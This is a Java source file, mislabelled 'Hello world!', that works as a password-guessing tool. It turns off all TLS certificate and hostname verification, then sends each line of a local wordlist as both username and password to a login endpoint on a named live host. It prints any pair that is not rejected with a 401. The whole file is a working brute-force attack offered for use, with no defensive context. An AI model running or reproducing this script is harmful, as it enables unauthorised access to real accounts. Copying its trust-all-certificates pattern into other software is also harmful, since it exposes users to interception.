package com.example;

import com.alibaba.fastjson2.JSONObject;

import javax.net.ssl.*;
import java.io.*;
import java.net.URL;
import java.nio.file.Paths;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.List;

/**
 * Hello world!
 *
 */
public class App {
    public static void main( String[] args ) {

        try {
            // 创建一个信任所有证书的TrustManager
            TrustManager[] trustAllCerts = new TrustManager[] {
                    new X509TrustManager() {
                        public X509Certificate[] getAcceptedIssuers() {
                            return null;
                        }
                        public void checkClientTrusted(X509Certificate[] certs, String authType) { }
                        public void checkServerTrusted(X509Certificate[] certs, String authType) { }
                    }
            };

            // 安装全局的信任管理器
            SSLContext sc = SSLContext.getInstance("SSL");
            sc.init(null, trustAllCerts, new java.security.SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            // 创建一个空的HostnameVerifier，跳过主机名校验
            HostnameVerifier allHostsValid = (hostname, session) -> true;
            HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);

            // 要发送POST请求的URL
            URL url = new URL("https://video.bystart.icu/Users/authenticatebyname");
            HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();

            // 设置请求方法为POST
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json; utf-8");
            conn.setRequestProperty("Accept", "application/json");
            conn.setDoOutput(true);
            final int[] i = {0};
            getData().forEach(e->{
                // 构建JSON格式的请求参数
                JSONObject jsonObject = new JSONObject();
                jsonObject.put("Username",e);
                jsonObject.put("Pw",e);
                try {

                    Thread.sleep(10);
                    // 发送请求
                    try(OutputStream os = conn.getOutputStream()) {
                        byte[] input = jsonObject.toJSONString().getBytes("utf-8");
                        os.write(input, 0, input.length);
                    }

                    // 获取响应
                    int responseCode = conn.getResponseCode();
                    if (401!=responseCode){
                        System.out.println("Response Code: " + responseCode);
                        System.out.println("UserName:"+e+",Pw:"+e);
                        return;
                    }
                    System.out.println("try: "+ ++i[0]);
                    conn.disconnect();
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            });


        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static List<String> getData(){
        ArrayList<String> strings = new ArrayList<>();
        String filePath = "C:\\Users\\bowang28\\Desktop\\测试\\字典\\pw.txt"; // 请将此处替换为您的文件路径

        try (BufferedReader br = new BufferedReader(new FileReader(filePath))) {
            String line;
            while ((line = br.readLine()) != null) {
                strings.add(line);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return strings;
    }
}